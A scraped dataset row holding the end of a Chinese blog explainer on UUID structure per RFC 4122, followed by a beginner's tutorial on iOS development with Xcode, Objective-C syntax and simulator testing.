<p>urn:uuid:f81d4fae-7dec-11d0-a765-00a0c91e6bf6</p>

<h2>字段组成(详情与事例代码,参考RFC4122 section4 till the end)</h2>

<p>UUID采用Big-endian字节序排列</p>

<p>变量(variant), 或称做类型, 4 bytes, 包括以下4种（其中X为任意值）:<br>
0XX NCS兼容预留<br>
10X RFC4122采用<br>
110 微软兼容预留<br>
111 还未定义, 留作以后它用</p>

<p>版本号(version), 4 bytes,  一共以下5个版本:<br>
0001  时间的版本<br>
0010  DCE Security<br>
0011  MD5哈希<br>
0100  (伪)随机数<br>
0101  SHA-1哈希</p>

<p>时间戳(timestamp), 60bit:<br>
版本1: 时间戳采用UTC时间,以100ns为间隔,重1582年10月15日00:00:00.00开始计算</p>

<p>时钟序列, 14bit:<br>
版本1: 用来防止在时间回调的情况下,导致的UUID重复问题<br>
如果有时间回调(可能有系统断电导致),如果生成器在回调时间之后有生成新的UUID,那么时钟序列应该改变, 如果新生成的UUID时钟序列可知,那么时钟序列递增即可; 若不可知, 那么时钟序列应重置到一个47位随机数,或一个47位高质量的伪随机数,并且第48位设置为1,用来区别真正的MAC地址(由于所有MAC地址在网卡中第48为0)</p>

<p>节点(node), 48bit:<br>
版本1: 为主机MAC地址, 若主机有多个MAC地址,随机选其中一个, 若系统没有MAC地址, 则采用(伪)随机数.</p>

<p><em>其他版本请参考原文, 其中版本2没有在原文中叙述</em></p>

<h2>Nil UUID</h2>

<p>128位中,每一位都是零, (A.K.A)<br>
urn:uuid:00000000-0000-0000-0000-000000000000</p>

<blockquote>
  <p>感谢您的大驾光临, 无论您是习惯右手, 还是左手点赞都木有关系, 如果本文对您有那么丁点儿帮助, 请用您最销魂的姿势点个赞. 如有问题请留言!</p>
</blockquote>

                ", UUID唯一资源命名空间的来龙去脉(RFC4122),1531972181,368,1,291,1,1,https://segmentfault.com/a/1190000000484508
191,1,0,6,"
                    
<h1>iOS开发60分钟入门</h1>

<p>本文面向已有其它语言（如Java，C，PHP，Javascript）编程经验的iOS开发初学者，初衷在于让我的同事一小时内了解如何开始开发iOS App，学习目标包括：</p>

<ul>
<li>能使用Xcode IDE、模拟器</li>
<li>能修改、调试已有iOS App</li>
<li>能在已有应用内创建新模块</li>
<li>能创建新应用</li>
<li>能发布应用到App Store</li>
</ul>
<p>本文不包含任何高级的iOS开发知识，已学会iOS开发的同学不要看，看完这篇文章学会了的同学也不用再看了。</p>

<h2>不仅是学习一门新语言</h2>

<p>有过脚本开发经验的人（如Javascript，PHP，Shell）在刚开始学习iOS开发的时候，会觉得iOS开发的学习曲线比脚本语言要高，是的，这种感觉是对的。因为学iOS开发，不仅是学习一门新语言，它包括：</p>

<ul>
<li>一门语言：Objective-C</li>
<li>一个框架：Cocoa Touch</li>
<li>一个IDE：Xcode</li>
</ul>
<p>初学脚本语言通常不会来绘制图形界面、与人交互，iOS如果不做图形界面，像脚本语言一样处理文本操作数据库，就没啥意思了。</p>

<p>所以，过去我写别的新手入门教程，通常都是写《XXX入门15分钟教程》，而iOS就要花数倍的时间来写了。</p>

<h2>环境准备</h2>

<p>做iOS开发一定要有苹果的软件环境：Mac OS操作系统、Objective-C编译器、设备模拟器等，开发工具倒不一定要用Xcode，只要是个源代码编辑工具就行（vim都行，只是没Xcode那么多功能）。</p>

<h3>Mac OS</h3>

<p>拥有Mac OS环境最简单的方法是找一台苹果电脑，包括iMac, MacBook Pro, MacBook Air, Mac Mini，但不包括苹果的移动设备（iPod Touch, iPhone, iPad, iPad Mini，它们运行的是iOS系统，不是Mac OS），苹果电脑在出厂的时候就会预装Mac OS，目前最新版本是Mac OS X 10.8，主流的版本还有Mac OS X 10.6、Max OS X 10.7。</p>

<p>如果囊中羞涩，可以借一台，或者上淘宝买个二手的。</p>

<h4>黑苹果</h4>

<p>提到iOS开发入门，似乎没办法不说黑苹果。所谓黑苹果，就是把Mac OS改造后安装在非苹果的硬件上，这是违反DMCA法案的，黑苹果的更多资料，<a rel=""nofollow"" href=""http://en.wikipedia.org/wiki/OSx86"">可以在维基上找到</a></p>

<p>苹果电脑价格高，国内软件开发者生存压力大，所以黑苹果在国内也有一些真实的存在，国外当然也有啦。</p>

<p>黑苹果基本可以胜任iOS开发，但有一些问题：</p>

<ul>
<li>安装黑苹果是非法的</li>
<li>个人行为苹果公司一般不会追究，但会遭同行的鄙视</li>
<li>黑苹果超级难装，挑硬件。即使完全相同的型号，相同的批次，也有可能A机器装上了，B机器装不上</li>
<li>黑苹果系统多少都存在一些使用上的问题，像驱动Bug啦、待机恢复蓝屏啦、上网浏览有问题啦</li>
<li>黑苹果不能随意升级，可能升级一次safari就导致整个系统崩溃了</li>
</ul>
<p>上面这些虽然不会直接影响Xcode写代码、模拟器测试，但写着写着想上网查个东西的时候，safari不能翻页，确实挺影响心情的。所以，钱包允许的前提下，还是搞个苹果电脑省心一些。</p>

<h3>Xcode 和 模拟器</h3>

<p>Xcode可以在苹果官网免费下载：<a rel=""nofollow"" href=""https://developer.apple.com/Xcode/index.php"">Xcode下载地址</a></p>

<p>安装Xcode时会自动安装iOS SDK和模拟器。</p>

<p>这么强大的IDE居然是免费的，还是挺让人开心的。</p>

<h2>从改一个现成的应用开始吧</h2>

<p>学一门新软件开发技能，能够第一时间做出一个可运行的产品非常重要，有助于给自己正面激励，我上大学的时候，有很多次想学一门新语言，往往花了半个月，还沉浸在数据类型和语法字典里，连第一个Hello World都没做出来。</p>

<p>这一次，就让我们从改一个现成的应用开始吧。</p>

<h3>下载</h3>

<p>首先，我们从苹果开发者中心下载一个示例代码回来。我选了<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/samplecode/ToolbarSearch/ToolbarSearch.zip"">ToolBarSearch</a>。</p>

<p>在本文档的末尾，还有一些其它的网址可以下载开源iOS产品或者代码段，但我试了一下，还是Apple Sample Code最容易成功。</p>

<p>下载回来的zip文件最好保存在""下载""或者""文稿""目录里，因为在Mac OS 10.8以前，有些目录（例如/var/private/tmp）在Finder中是看不到的，要通过Finder的“前往 &gt; 前往文件夹”功能才能进入。</p>

<h3>打开</h3>

<p>有三种方式可以打开一个iOS Project</p>

<h4>双击project文件</h4>

<p>打开Finder，进入刚刚下载解压的ToolBarSearch目录，找到ToolBarSearch.Xcodeproj文件，双击之，Xcode会自动启动，并打开这个项目</p>

<h4>在Xcode里选择Project打开</h4>

<ul>
<li><p>在Xcode没启动的情况下（如果Xcode已经启动了，就先按Command Q退出），启动Xcode，会弹出“Welcome to Xcode”的欢迎页，点击左下角的“Open Other”按钮，找到ToolBarSearch目录，双击ToolBarSearch目录，或者双击ToolBarSearch.Xcodeproj文件都可以</p></li>
<li><p>如果Xcode处于打开状态，可以点击其菜单栏的File -&gt; Open，或者File -&gt; Open Recent，然后再选择要打开的项目</p></li>
</ul>
<h4>通过命令行打开</h4>

<p>在Mac OS 10.8以前，有些目录（例如/var/private/tmp），在Finder和Xcode的File &gt; Open对话框中，点击鼠标是找不到的，这时候就要通过命令行终端来打开了。</p>

<p>打开终端，执行：</p>

<pre><code>cd /ToolBarSearch的父目录/ToolBarSearch
open -a Xcode
</code></pre>

<p>open -a是mac os的系统命令，除了iOS项目，别的项目也可以这样打开。</p>

<h3>运行刚下载的应用</h3>

<p>点击Xcode左上角的Run按钮（或者同时按下Comman和R键），Xcode会编译源码并在模拟器中运行这个应用。</p>

<p>编译成功会在屏幕上淡淡地显示“Build Succeeded”。反之，失败就显示“Build Failed”且不启动模拟器。</p>

<h3>修改</h3>

<p>在模拟器上看到“Performed search using…”了吧，下面我们改掉它。</p>

<ul>
<li><p>在Xcode左上角的Run按钮下方，有一排小按钮，从左到右第三个是一个放大镜图标，鼠标移上去会显示“Show the Search Navigator”，点一下它，打开搜索界面，在它下方出现的Find输入框中输入“performed”</p></li>
<li><p>搜索结果只有一条：ToolbarSearchViewController.m，点文件名下方被高亮的“Performed”字串，右侧代码编辑区会自动打开这个文件，并滚动屏幕，使包含“Performed”的这一行出现在编辑区的中间。</p></li>
<li><p>修改双引号里的字串，随便改成啥，然后按“Command S”保存。</p></li>
</ul>
<p>当然，这些操作，你也可以在终端下通过grep和vim完成。</p>

<h3>运行修改后的应用</h3>

<p>按Command R运行，看看，是不是看到效果啦？</p>

<p>是的，修改一个应用就这么简单。</p>

<h2>Objective-C</h2>

<p>Objective-C是苹果应用软件（包括苹果电脑上的Mac OS App和移动设备上的iOS App）的开发语言。它是一种面向对象的编程语言。</p>

<p>苹果公司还提供了一个软件，叫Interface Builder，简称IB，用于可视化的界面制作，就像用Dreamweaver做网页，或者像Visual Basic做桌面软件一样。后来IB就整合进了Xcode，成了Xcode的一部分。这篇文档不讲IB，只讲Objective-C，因为：</p>

<ul>
<li>基本上，每一本讲iOS开发的书（纸质书、电子书），都有大量的截图一步一步教如何用IB开发iOS应用，而讲Objective-C开发应用的书却没有那么多。</li>
<li>IB可以用来直观方便地画界面、设置控件属性、建立代码与控件的联系，但后台的业务逻辑和数据处理仍然要靠Objective-C，可见，不管用不用IB，Objective-C都是绕不过去的。</li>
</ul>
<h3>C的超集</h3>

<p>Objective-C扩展了ANSI C，是C的超集，也就是说：</p>

<ul>
<li>任何C源程序，不经修改，即可通过Objective-C编译器成功编译</li>
<li>Objective-C源程序中可以直接使用任何C语言代码</li>
</ul>
<p>除了面向对象有语法是SmallTalk风格的（下面会讲到），其它非面向对象的语法、数据类型，与C完全相同，所以本文就不再赘述。<br>
来看一个经典的Hello World示例吧：</p>

<pre><code>#import &lt;Foundation/Foundation.h&gt;
int main(int argc, char *argv[]){
    @autoreleasepool{
        NSLog(@""Hello World!"");
    }
    return 0;
}
</code></pre>

<p>是不是仿佛穿越回了大一学习C语言的时代，看起来和C几乎没有区别，是吧？是的，因为还没用到它的面向对象特性，哈哈！</p>

<h3>SmallTalk的消息传递语法风格</h3>

<p>Objective-C的面向对象语法源自SmallTalk，消息传递（Message Passing）风格。在源码风格方面，这是它与C Family语言（包括C/C++、Java、PHP）差别最大的地方。</p>

<p>在Java、C++世界，我们调用一个对象的某方法，在Objective-C里，这称作给类型发送一个消息，这可不仅仅是文字游戏，他们的技术细节也是不同的。</p>

<p>在Java里，对象和方法关系非常严格，一个方法必须属于一个类/对象，否则编译是要报错的。而在Objective-C里，类型和消息的关系比较松散，消息处理到运行时（runtime）才会动态决定，给类型发送一个它无法处理的消息，也只会抛出一个异常，而不会挂掉。</p>

<pre><code>[obj undefinedMethod];
</code></pre>

<p>在代码里调用没定义的方法（这是Java世界的习惯说法啊，专业的叫法是，给obj对象传递它无法处理的消息），Xcode会警告，但编译能成功，运行的时候会出错。它会输出这样一个错误：</p>

<pre><code>Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[NSObject undefinedMethod]: unrecognized selector sent to instance 0x8871710'
</code></pre>

<h3>类似Java的OOP概念</h3>

<p>Objective-C中一些面向对象的概念，也可以在Java中找到类似的实现（只能说是类似，不是完全相同），我的读者基本都是Java和PHP程序员，我会在下文中尽量用Java的概念来类比。</p>

<p>GoogleCode上有人整理了Java和Objective-C的概念、数据类型对应表，<a rel=""nofollow"" href=""http://code.google.com/p/j2objc/wiki/JavaConversions"">参见这里</a></p>

<h3>字符串</h3>

<p>Objective-C里有字符串是由双引号包裹，并在引号前加一个@符号，例如：</p>

<pre><code>title = @""Hello"";
if(title == @""hello"") {}
</code></pre>

<p>PHP程序员要注意，在这里不能用单引号，即使只有一个字符也不能用。Objective-C与Java、C一样，双引号表示字符串。</p>

<h3>函数调用</h3>

<p>前文述及，不涉及面向对象时，它和C是完全一样的。以下是几个函数调用的示例：</p>

<h4>不带参数</h4>

<pre><code>startedBlock();
</code></pre>

<h4>带参数</h4>

<pre><code>NSLog(@""decrypted string: %@"", str);
CGRectMake(0,0,0,0);
</code></pre>

<h3>传递消息给类/实例方法</h3>

<h4>不带参数</h4>

<pre><code>[obj method];
</code></pre>

<p>对应的Java版本</p>

<pre><code>obj.method();
</code></pre>

<h4>带一个参数：</h4>

<pre><code>[counter increase:1];
</code></pre>

<p>对应的Java版本</p>

<pre><code>counter.increase(1);
</code></pre>

<h4>带多个参数</h4>

<p>对C Family程序员来说，这是最难接受的，最反人类的：</p>

<pre><code>- (void) setColorToRed: (float)red Green: (float)green Blue:(float)blue {...} //定义方法
[myObj setColorToRed: 1.0 Green: 0.8 Blue: 0.2]; //调用方法
</code></pre>

<p>对应的Java版</p>

<pre><code>public void setColorToRedGreenBlue(float red, float green, float blue) {...}
myObj.setColorToRedGreenBlue(1.0, 0.8, 0.2);
</code></pre>

<h4>消息嵌套</h4>

<pre><code>UINavigationBar *bar = [[[UINavigationBar alloc] init] autorelease];
</code></pre>

<p>对应的Java版</p>

<pre><code>UINavigationBar bar = UINavigationBar.alloc().init().autorelease();//Java没有指针，所以星号去掉了
</code></pre>

<h3>类</h3>

<h4>接口和实现</h4>

<p>Objective-C的类分为接口定义和实现两个部分。接口定义（Interface）放在头文件中，文件扩展名是.h，实现（implementation）放在实现文件中，文件扩展名是.m（也有.mm的扩展名，表示Objective-C和C++混编的代码）。</p>

<p><code>接口定义也可以写在.m文件中，但最好不要这么干</code></p>

<p>需要注意的是，与Objective-C的interface概念最接近的是C和C++里的头文件，它与implementation是成双成对出现的，作用是声明类的成员变量和方法。它与Java的interface概念完全不同：</p>

<ul>
<li>Objective-C里，interface有且只有一个实现，Java的interface可以有0-N个实现</li>
<li>Objective-C里，interface可以定义成员属性，Java里不可以</li>
</ul>
<p>在Objective-C里，和Java的Interface概念相似的是Protocol，下文会讲到。</p>

<p>请看示例：</p>

<p>Interface</p>

<pre><code>@interface MyClass {
    int memberVar1;
    id  memberVar2;
}

-(return_type) instance_method1; 
-(return_type) instance_method2: (int) p1;
-(return_type) instance_method3: (int) p1 andPar: (int) p2;
@end
</code></pre>

<p>Implementation</p>

<pre><code>@implementation MyClass {
    int memberVar3;
}

-(return_type) instance_method1 {
    ....
}
-(return_type) instance_method2: (int) p1 {
    ....
}
-(return_type) instance_method3: (int) p1 andPar: (int) p2 {
    ....
}
@end
</code></pre>

<p>接口和实现以@interface、@implementation开头，都以@end结束。“@”符号在Objective-C中是个很神奇的符号。</p>

<p>冒号也是方法名的一部分，method和method:是两个不同的方法名，不是overload，第二个带参数。</p>

<p>上述代码对应的Java版：</p>

<pre><code>public class MyClass {
    protected int memberVar1;
    protected pointer memberVar2;
    private int memberVar3;

    public (return_type) instance_method1() {
        ....
    }

    public (return_type) instance_method2(int p1) {
        ....
    }

    public (return_type) instance_method3andPar(int p1, int p2) {
        ....
    }
}
</code></pre>

<h4>私有方法和公开方法</h4>

<p>写在.h头文件里的方法都是公开的，Objective-C里没有私有方法的概念（没有你说个蛋啊，哈哈哈哈）。</p>

<p>官方并没有提到Objective-C怎么实现私有方法，我查阅了stackoverflow，统一的答案是，要实现私有方法的效果只能借助Category，不过，根据我的测试，即使采用了Category，也不能阻止外部的代码调用这个“私有方法”，只是Xcode不支持“私有方法”的自动完成，并会有警告提示，运行的时候，还是会成功的。各位看官知道有这么回事就可以了，这里不深讲。</p>

<h4>变量和属性</h4>

<h4>类方法和实例方法</h4>

<h5>类方法</h5>

<p>类方法就是Java、PHP里的Static Method，不用实例化就能调。类方法有一个加号前缀。<br>
示例：</p>

<p>类定义</p>

<pre><code>@interface MyClass
    +(void) sayHello;
@end

@implementation MyClass

+(void) sayHello {
    NSLog(@""Hello, World"");
}
@end
</code></pre>

<p>使用</p>

<pre><code>[MyClass sayHello];
</code></pre>

<h5>实例方法</h5>

<p>实例方法就是Java、PHP里的普通方法，必须实例化才能调。实例方法有一个减号前缀。<br>
示例：</p>

<p>类定义</p>

<pre><code>@interface MyClass : NSObject
-(void) sayHello;
@end

@implementation MyClass

-(void) sayHello {
    NSLog(@""Hello, World"");
}
@end
</code></pre>

<p>使用</p>

<pre><code>mycls = [MyClass new];
[mycls sayHello];
</code></pre>

<h4>Selector</h4>

<p>selector就是一个方法指针，类似PHP里的动态方法名：</p>

<pre><code>&lt;?php
class Hello {
    public function sayHello() {}

    public function test() {
        $fun_name = ""sayHello"";
        $this-&gt;$fun_name();
    }
}
</code></pre>

<p>在Objective-C里，selector主要用来做两类事情：</p>

<h5>绑定控件触发的动作</h5>

<pre><code>@implementation DemoViewController
- (void)downButtonPressed:(id)sender {//响应“按钮被按下事件”的方法
    UIButton *button = (UIButton*)sender;
    [button setSelected:YES];
}

- (void)drawAnButton {
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom]; 
    btn.frame = _frame; 
    btn.tag = 1;
    btn.backgroundColor = [UIColor clearColor];
    [btn addTarget: self
         action: @selector(downButtonPressed:)
         forControlEvents: UIControlEventTouchUpInside];//当这个按钮被按下时，触发downButtonPressed:方法
}
@end
</code></pre>

<h4>延时异步执行</h4>

<pre><code>@implementation ETHotDealViewController
- (void)viewDidLoad {

    //获取数据源
    HotDealDataSource *ds = [[HotDealDataSource alloc]init];
    [ds reload];
    _items = ds.items;

    [self performSelector: @selector(refreshTable)
          withObject: self
          afterDelay: 0.5];//延迟0.5秒调用refreshTable方法
}

-(void)refreshTable
{
    [self.tableView reloadData];
}
@end
</code></pre>

<p>这个例子中，获取数据源是通过ASIHTTP组件异步调用服务端HTTP接口，refreshTable要用到数据源返回回来的数据，如果不延迟0.5秒，就会立刻执行，执行的时候数据还在路上呢，页面就要变空白了。</p>

<h3>继承</h3>

<p>继承是写在Interface定义里面的。语法为：子类名在左，父类名在右，中间用冒号分隔。<br>
示例：</p>

<pre><code>@interface MyClass : NSObject
@end
</code></pre>

<p>对应的Java版本是：</p>

<pre><code>public class MyClass extends NSObject {
}
</code></pre>

<h3>协议（Protocol）</h3>

<p>就是Java、PHP里的Interface。</p>

<h4>协议的定义</h4>

<p>协议的定义用@protocol关键字：</p>

<pre><code>@protocol Printable
    -(void)print:(NSString)str;
@end
</code></pre>

<p>对应的Java版本是：</p>

<pre><code>publilc interface Printable {
    public void print(String str);
}
</code></pre>

<h5>协议的继承</h5>

<p>协议本身也可以继承别的协议：</p>

<pre><code>@protocol Printable &lt;NSObject&gt;
    -(void)print:(NSString)str;
@end
</code></pre>

<p>对应的Java版本：</p>

<pre><code>public interface Printable extends NSObject {
    public void print (String str);
}
</code></pre>

<h5>可选方法</h5>

<p>协议可以包含可选方法，顾名思义，可选方法可以不被类实现：</p>

<pre><code>@protocol Printable
@optional
    -(void)print:(NSString)str;
@end
</code></pre>

<p>加了@optional关键字，一个类在implements这个协议时，便可以不实现print:方法。</p>

<p>Java里没有类似的实现，除了Collection里会有一些方法带有optional的注释，但Collection是个特例。</p>

<h4>协议的实现</h4>

<p>一个类实现某些协议是写在Interface定义里面的。语法为：协议名用尖括号包裹，多个协议名用逗号隔开，协议写在父类的右边（如果没有父类就直接写在子类右边）。</p>

<p>示例：</p>

<pre><code>@interface  class MyClass : NSObject &lt;Printable, Drawable&gt;
@end
</code></pre>

<p>Printable, Drawablw就是两个协议。</p>

<p>对应的Java版本是：</p>

<pre><code>public class MyClass extends NSObject implements Printable, Drawable {
}
</code></pre>

<h3>分类（Category）</h3>

<p>分类可以给一个已经存在的类增加方法，而不用去改它的源码。Java和PHP中都没有类似的特性。</p>

<p>比如说，NSObject是一个Objective-C内置的系统类，我们想给它增加toJson方法，就像这样：</p>

<p>头文件：NSObject+Json.h</p>

<pre><code>@interface NSObject (Json)
    -(NSString)toJson;
@end
</code></pre>

<p>实现文件：NSObject+Json.m</p>

<pre><code>@implementation NSObject (Json)
    -(NSString)toJson {
        //...
    }
@end
</code></pre>

<p>使用的时候，只要包含NSObject+Json.h，实例化NSObject类，就可以使用toJson方法了：</p>

<pre><code>import ""NSObject+Json.h""
@implatementation XYZController
    -(void)test {
        NSObject *obj = [[NSObject alloc]init];
        NSString *str = [obj toJson];
    }
@end
</code></pre>

<p>当然了，NSObject本来的那些方法依然还是可以用的，什么都没变，只是多了个toJson方法。看起来是不是和继承没太多差别呢（除了使用的时候实例化的是NSObject，而不是JsonObject）？再看一个继承实现不了的例子：</p>

<p>头文件：NSObject+Json+XML.h</p>

<pre><code>@interface NSObject (Json)
    -(NSString)toJson;
@end

@interface NSObject (XML)
    -(NSString)toXML;
@end
</code></pre>

<p>实现文件：NSObject+Json+XML.m</p>

<pre><code>@implementation NSObject (Json)
    -(NSString)toJson {
        //...
    }
@end

@implementation NSObject (XML)
    -(NSString)toXML {
        //...
    }
@end
</code></pre>

<p>使用：</p>

<pre><code>import ""NSObject+Json+XML.h""
@implatementation XYZController
    -(void)test {
        NSObject *obj = [[NSObject alloc]init];
        NSString *json = [obj toJson];
        NSString *xml = [obj toXML];
    }
@end
</code></pre>

<h2>Cocoa Touch</h2>

<p>Cocoa是Mac OS App的开发框架，Cocoa Touch是iOS开发用的框架，Cocoa Touch和Cocoa大部分是一样的，只是Cocoa Touch多了一些移动设备特有的东西，如：触摸屏、加速度传感器、GPS定位。Cocoa中多任务、多窗口的特性，在Cocoa Touch中也是没有的（或者跟Cocoa不完全一样的）。</p>

<p>就像学了Java语言还要再学一些Spring、Hibernate、Struts（或者其它类似的Java类库）才能开始做J2EE应用一样，学过Objective-C语言之后，也要再学习Cocoa Touch框架才能顺利地开发iOS应用。</p>

<h3>最常用设计模式之Delegate</h3>

<p>Cocoa Touch大量使用Delegate（委派）设计模式。</p>

<h3>常用控件：按钮、文本块、图片、输入框</h3>

<h3>TableView</h3>

<h3>WebView</h3>

<h3>导航条</h3>

<h2>Xcode</h2>

<h3>运行</h3>

<p>快捷键：Comman R</p>

<h3>搜索</h3>

<h4>搜索文本</h4>

<h4>搜索文件</h4>

<h3>新建文件/目录</h3>

<p>推荐在Finder中新建好的再添加进来</p>

<h3>断点</h3>

<h2>模拟器和真机测试</h2>

<h3>模拟器测试</h3>

<p>在Xcode中打开你的项目，在Xcode顶部工具栏的Stop按钮（Run按钮右边那个黑色正方形按钮）右边，有个下拉菜单，显示着 “ToolBarSearch &gt; iPhone 5.0 Simulator” （即 你的应用英文名 &gt; 当前选中的调试 ），点击这个下拉菜单，选中iPhone 5.0 Simulator（这里的5.0是指iOS版本，不是iPhone5的意思，如果你的项目是iPad应用，请选iPad 5.0 Simulator），再按“Run”按钮，Xcode就会自动把当前正在编辑开发的应用编译并安装到模拟器上。</p>

<p>在模拟器上操作时，如果执行过程中遇到了你在Xcode里设置的断点，模拟器会暂停运行，并将当前活动窗口切换回Xcode，供你调试。</p>

<p>在Xcode里增加或者取消了断点，不需要重新编译和安装应用即可生效。</p>

<h4>切换被模拟的设备</h4>

<p>模拟器的“硬件”菜单，可以选择想要模拟什么设备，有iPad、iPhone可选。</p>

<ul>
<li>Retina：表示视网膜屏，iPhone(Retina)代表iPhone4，iPhone4S</li>
<li>4-Inch：表示4英寸的iPhone，iPhone(Retina 4-Inch)就是iPhone 5</li>
</ul>
<h4>切换模拟的iOS版本</h4>

<p>在模拟器的“版本”菜单，可以选择要模拟什么版本的iOS。设备和版本是彼此独立的，iPhone 4S可以有5.0，5.1，6.1几种iOS版本，当然了，iPhone 5不可能有4.3的iOS版本。</p>

<h4>触摸屏</h4>

<p>用鼠标点击（不区分左右键）模拟器上的iPhone、iPad屏幕，就是在模拟用手指触摸iPhone，iPad的屏幕，可以实现一些触摸效果比如：</p>

<ul>
<li>鼠标单击 等于 手指轻触</li>
<li>鼠标长按 等于 手指长按（例如你可以在模拟器上长按应用icon调出删除应用的确认框）</li>
<li>鼠标按住拖动 等于 手指拖动</li>
<li>双击和单击模拟器的Home键也等于双击和单击真机的Home键</li>
</ul>
<h5>多指手势</h5>

<p>多指手势比较复杂，在白苹果笔记本上可以模拟简单的双指手势，白苹果的触控板天然支持多指触摸，但要定位到模拟器的区域再响应多指手势就需要借助一些额外的键啦：</p>

<ul>
<li>按住Option键，再用两个手指去操作触摸板，可模拟双指拖动、旋转</li>
<li>按住Option+Shift，可模拟双指合拢</li>
</ul>
<h4>输入法和键盘</h4>

<h5>输入中文</h5>

<p>手机上特有的输入法（比如九宫格输入法）不能模拟。模拟器默认的iOS软键盘只有英文输入，在测试应用的时候，我们要用到中文，有两个办法：</p>

<ul>
<li>使用剪贴板，在Mac OS里复制，再到模拟器运行的应用中的输入框上长按鼠标（模拟手指长按）3秒以上，等弹出“粘贴”的时候选择之，即可。</li>
<li>在模拟器里，按Home键，找到Setting那个App icon（不是Mac OS顶部的模拟器菜单啊，那里没有Setting的），打开被模拟iOS设备的设置，依次点击”General - Keyboard - International Keyboards - Add New Keyboard…”，加个中文键盘，以后就可以使用被模拟iOS设备软件盘输入中文了，跟在iPhone/iPad真机上一样。</li>
</ul>
<h4>使用Mac电脑的键盘</h4>

<p>如果要输入大量文本，使用模拟器里的软键盘效率太低，这时候可以使用物理键盘，方法是：在Mac OS顶部的模拟器菜单栏，点击”硬件”菜单，勾选下拉菜单中的“模拟硬件键盘”。以后再用模拟器运行iOS应用时，点击iOS应用中的输入框，软键盘就不弹出来了，可直接使用Mac电脑的物理键盘输入。</p>

<p><em>注意</em>：</p>

<ul>
<li>模拟器中的iOS接管了物理键盘输入，所以，调用的是模拟器iOS的输入法，不是你的Mac电脑的输入法。打个比方，你的Mac OS装的是搜狗五笔，模拟器中iOS加了个拼音输入法（Add New Keyboard），那么，在iOS应用中输入中文会调用拼音输入法。</li>
<li>要切换模拟器中iOS的中英文输入法，也只能按iOS设备软键盘上的小地球图标，按Mac电脑上的Command+空格键是不行的。</li>
</ul>
<h4>地理位置</h4>

<p>但Mac电脑没有定位用的硬件（GPS）和软件基础，因此模拟器不能自动获得当前的地理位置，不能用模拟器测试定位功能。（注意，虽然WiFi也可以独立定位——iPad WiFi版没有GPS也可以定位，但Mac电脑的WiFi不具备定位相关的软件）</p>

<p>要在模拟器里测试依赖地理位置的功能（如”我附近的xx”），可以手工指定一个经纬度给模拟器，方法：在Mac电脑顶部的模拟器菜单，点击”调试 - 位置 - 自定位置”，会弹出一个对话框，在弹出的框内填入经纬度即可。</p>

<p>如何获得经纬度？<br>
上谷歌地图（ditu.google.cn），在地图上找到你想要的位置（比如你想知道杭州大厦的位置，就在通过搜索框找到杭州大厦），点击右键，选择“这儿是什么”，搜索框中就会出现这个位置的经纬度了，前面是纬度，后面是经度。咱们天朝的版图，都是北纬和东经。</p>

<h4>摄像头</h4>

<p>Mac电脑有摄像头，但Mac OS没有设计API给iOS模拟器调用，所以，不能用模拟器测试对焦闪光灯等功能。</p>

<p>要在模拟器上测试依赖照片的功能，可以在代码里做一个workaround，即当代码检测到摄像头不可用时，弹出一个照片选择器，让测试人员从相册里选择一幅照片，来进行后续的操作（如照片美化、人脸识别、条码扫描）。</p>

<h3>真机测试</h3>

<p>模拟器能验证你开发的iOS应用的大部分功能，但有些Mac设备上不具备的硬件，模拟器是不能模拟的。前文提到了一个绕过这些限制的办法，但获取当前位置、拍照、加速度感应这些是模拟不了的，一款应用发布给消费者之前，必须要在真实设备上验证过。</p>

<p>将未提交App Store审核通过的应用安装到iOS设备上测试，有三种办法：</p>

<ul>
<li>加入苹果的Developer Program，成为付费会员，有了这个付费会员资格，就可以直接在Xcode中点击”Run”将刚刚改过的代码编译打包安装到开发测试用的iOS设备上。在iOS真机上操作被测试的程序能激活Xcode中设置的断点。</li>
<li>越狱iOS设备。将iPhone和iPad越狱后，可以通过SSH直接上传Xcode编译好的ipa包（一个iOS App本质上就是一个ipa包）。</li>
<li>越狱的iOS设备，配合破解过的Xcode，甚至可以实现和付费开发者计划一样的功能：在Xcode上点击”Run”，就自动编译安装到iOS设备上去运行了</li>
<li>企业部署方案。就像阿里巴巴的<a rel=""nofollow"" href=""http://xyj.im"">轩辕剑</a>一样，用iPhone/iPad访问这个网址，点击里面的轩辕剑链接就可以安装轩辕剑这个应用了。</li>
</ul>
<p>破解Xcode是违法行为（越狱是合法的），而且挑版本挑得厉害，不是所有Xcode版本都能破解，也不是所有Xcode的破解版都能和越狱的iOS配合好。越狱+SSH上传跟企业部署一样效率低（部署效率低，无法激活Xcode中的断点），只能用于QA验收，不适合开发自测。综上所述，最适合开发实时测试的就是第一个正规途径了。下面重点讲这个：</p>

<h4>拥有一个开发者账号</h4>

<p>苹果的Developer Program分为个人开发者和公司开发者，分别是每年99美元和每年299美元，分别可以注册100台和500台苹果测试设备。这个台数限制在一个付费年度内不会清空，比如说，2013年4月1日付费成功的，付费会员资格在2014年3月31日之前有效，这期间，注册一台就少一个名额，哪怕这个设备注册进来用了之后一分钟马上又删掉了，减少的这个名额也不会回来。</p>

<p>在交钱之前，最好问一下，周围的同事，有没有已经交了钱的。如果有，你只需要注册一个免费的Apple ID（就是你在App Store安装软件用的Apple ID），请他发个邀请邮件给你，把你的Apple ID加入他的团队就可以了，苹果会认为你们两个人是一个团队的，你们分别用自己的账号，共享100台设备的限额，这是合法的。</p>

<h4>安装证书和私钥</h4>

<h5>证书</h5>

<p>不想看下面各种点击各种页面跳转的直接用浏览器访问<a rel=""nofollow"" href=""https://developer.apple.com/ios/manage/certificates/team/index.action"">证书管理</a>，你要登录你就用Apple ID登录（前提是交过钱，或者找交了钱的人把你加入团队了）。<br>
&gt;<br>
不嫌烦，或者想知道下次没我这个文档的时候怎么进证书管理吗？按这个步骤操作：</p>

<ul>
<li>进入 <a rel=""nofollow"" href=""https://developer.apple.com/"">苹果开发者中心</a>
</li>
<li>点击iOS Dev Center</li>
<li>点蓝色“Login”按钮，用你的Apple ID登录，登录成功会跳到 <a rel=""nofollow"" href=""https://developer.apple.com/devcenter/ios/index.action"">开发者首页</a>
</li>
<li>点击右上角的<a rel=""nofollow"" href=""https://developer.apple.com/ios/manage/overview/index.action"">iOS Provisioning Portal</a>（别找了，直接Command F搜索多好）</li>
<li>点左侧菜单栏里的<a rel=""nofollow"" href=""https://developer.apple.com/ios/manage/certificates/team/index.action"">Certificates</a>
</li>
</ul>
